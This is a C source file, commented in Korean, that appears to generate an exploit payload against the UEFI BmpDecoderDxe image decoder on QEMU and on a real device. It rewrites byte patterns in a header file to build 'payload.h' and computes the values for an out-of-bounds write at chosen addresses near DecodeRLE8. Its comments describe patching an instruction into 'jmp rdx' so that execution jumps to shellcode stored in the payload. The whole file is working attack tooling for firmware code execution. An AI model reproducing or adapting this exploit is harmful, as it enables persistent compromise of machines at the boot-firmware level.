#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

void modify_hex_value_in_file(const char* input_file, const char* output_file, unsigned char new_value, unsigned char new_value2, int n) {
    if ((new_value < 0x00 || new_value > 0xFF) || (new_value2 < 0x00 || new_value2 > 0xFF)) {
        printf("Error: new_value and new_value2 must be between 0x00 and 0xFF\n");
        return;
    }

    FILE* infile = fopen(input_file, "rb");
    if (!infile) {
        printf("Error: Unable to open input file.\n");
        return;
    }

    fseek(infile, 0, SEEK_END);
    long file_size = ftell(infile);
    fseek(infile, 0, SEEK_SET);

    char* content = (char*)malloc(file_size + 1);
    if (!content) {
        printf("Error: Memory allocation failed.\n");
        fclose(infile);
        return;
    }

    fread(content, 1, file_size, infile);
    fclose(infile);

    const char* original_pattern = "0x00, 0x02, 0x00, 0xFF, ";
    char modified_pattern1[32];
    char modified_pattern2[32];
    sprintf(modified_pattern1, "0x00, 0x02, 0x%02X, 0xFF, ", new_value);
    sprintf(modified_pattern2, "0x00, 0x02, 0x%02X, 0xFF, ", new_value2);

    int occurrences = 0;
    char* pos = content;

    while ((pos = strstr(pos, original_pattern)) != NULL) {
        occurrences++;
        if (occurrences == 1) {
            strncpy(pos, modified_pattern1, strlen(modified_pattern1));
        }
        else if (occurrences > 1 && occurrences <= n) {
            strncpy(pos, modified_pattern2, strlen(modified_pattern2));
        }
        pos += strlen(original_pattern);
    }

    FILE* outfile = fopen(output_file, "wb");
    if (!outfile) {
        printf("Error: Unable to open output file.\n");
        free(content);
        return;
    }

    fwrite(content, 1, file_size, outfile);
    fclose(outfile);
    free(content);
}

void find_a_b(uint32_t target_n, int32_t* a, uint32_t* b) {
    uint32_t base_value = 0x907F8;
    uint32_t multiplier = 0xFF * 4; // 1020
    int found = 0;

    // b의 범위는 0에서 255까지
    for (uint32_t b_value = 0; b_value <= 255; b_value++) {
        // a를 찾기 위해 주어진 식을 변형
        int32_t potential_a = (target_n - base_value - (b_value * 4)) / multiplier;

        // 조건: 나눗셈의 나머지가 0이면서 a가 유효한지 체크
        if ((target_n - base_value - (b_value * 4)) % multiplier == 0) {
            *a = potential_a; // a에 값 저장
            *b = b_value; // b에 값 저장
            found = 1; // a와 b의 유효한 조합을 찾았음을 표시
            break; // 유효한 조합을 찾았으므로 루프 종료
        }
    }

    if (!found) {
        *a = -1; // 유효한 조합이 없을 경우 a를 -1로 설정
        *b = 0xFFFFFFFF; // b를 유효하지 않은 값으로 설정
    }
}

int main(int argc, char* argv[]) {
    const char* input_file = "907F8_qemu_where.h";
    const char* output_file = "payload.h";


    // qemu BmpDecoderDxe base= 0x67E5000
    // >>> hex(0x907F8 + 0xFF*4*106224 + 0xF2*4)
    // n = 106224 + 1 = 106225
    // new_value = 0xF2
    // new_value2 = 0xFF
    // 0x67E5000 <- write where?
    //


    // physical BmpDecoderDxe base = 0x3D9BF000
    // target 0x3D9BF000 + 0x1000 = 0x3d9c0000 (data)
    // >>> hex(0x907F8 + 0x34*4 +  0xFF*4*1012786)
    // n = 1012786
    // new_value = 0x34
    // new_value2 = 0xFF
    // 0x3d9c0000 <- write where?
    // but actually.. 0x3d9c0000 - 1 = 0x3d9bffff
    // unsigned char new_value = 0x34;  // 첫 번째 패턴 수정값
    // unsigned char new_value2 = 0xFF; // 이후 n번째 패턴까지의 수정값
    // int n = 1012786 + 1;  // n 번째 발견된 패턴까지 변경


    // qemu BmpDecoderDxe base = 0x67E5000
    // target 0x67E5880 (DecodeRLE8 + 141)
    // >>> hex(0x907F8 + 0xFF*4*106227 + 0x15*4)
    // '0x67e5880'

    // qemu
    // target 0x67E5824 (DecodeRLE8 + E4)
    // >>> hex(0x907F8 + 0xFF*4*106226 + 0xfd*4)
    //'0x67e5824'
    // orig:    .text:00000000067E5824 48 FF C2                inc     rdx
    // patch:   jmp rdx

    //XXX 환경에 맞게끔 임의로 수정 필요!!! XXX
    uint32_t BmpDecoderDxe_BASE = 0x67E4000;
    uint32_t TARGET_ADDRESS = BmpDecoderDxe_BASE + 0x824;//0x824; //3바이트 nop; jmp rdx; 적힐 주소... 907F8.h 16번째 줄 참고
    TARGET_ADDRESS = 0x907F8; //where????

    bool IS_REAL_DEVICE = false;
    if (IS_REAL_DEVICE)
    {
        BmpDecoderDxe_BASE = 0x3D9BF000;
        TARGET_ADDRESS = 0x000000003D9BF824;//BmpDecoderDxe_BASE + 0x1000;//0x824;
    }

    //XXX 환경에 맞게끔 임의로 수정 필요!!! XXX

    //점프될 rdx 쉘코드는... payload.h 4210801번째 줄 참고


    int32_t a = 0; // a 초기화
    uint32_t b = 0; // b 초기화

    find_a_b(TARGET_ADDRESS, &a, &b);
    printf("a= %d, b= %u\n", a, b);

    unsigned char new_value = b;  // 첫 번째 패턴 수정값
    unsigned char new_value2 = 0xFF; // 이후 n번째 패턴까지의 수정값 (항상 고정)
    int n = a + 1;  // n 번째 발견된 패턴까지 변경

    modify_hex_value_in_file(input_file, output_file, new_value, new_value2, n);




    return 0;
}
